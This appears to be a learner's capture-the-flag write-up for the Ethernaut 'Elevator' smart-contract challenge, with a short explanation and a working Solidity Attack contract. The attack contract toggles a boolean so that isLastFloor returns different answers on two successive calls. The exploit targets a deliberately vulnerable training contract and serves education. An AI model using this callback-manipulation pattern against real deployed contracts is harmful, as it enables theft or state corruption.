## Elevator

1. This was too easy but at first i was like why is there a msg.sender in calling contract. And i watched a video then after 5 mins i understood that you attack as a contract and have that function in the attacking contract and it calls to attacking contract function. A trickky but easy.

- sauce: `https://www.youtube.com/watch?v=hlq-a8g17c4`

2. in Elevator contract the goTo() is the only function that can be called and it calls msg.sender contract function isLastFloor() and so our function should return false first in order to be true because of negation and then floor updates and then our isLastfloor() is false but should return true so that top variable updates.

3. We can do it in multiple way like use a counter and update the top on second call... or reverse the boolean during calls ... the video had reverse the boolean so i used that.

> Code :

```solidity

// i had copy pasted the instance contract given in challege above Attack

contract Attack {
    Elevator elevator;

    constructor(address _addr) {
        elevator = Elevator(_addr);
    }

    bool public makeItFalseAndThenTrue = true;

    function isLastFloor(uint) external returns (bool){
        makeItFalseAndThenTrue = !makeItFalseAndThenTrue;
        return makeItFalseAndThenTrue;
    }

    // call attack
    function attack() external {
        elevator.goTo(0);
    }
}
```

3. success
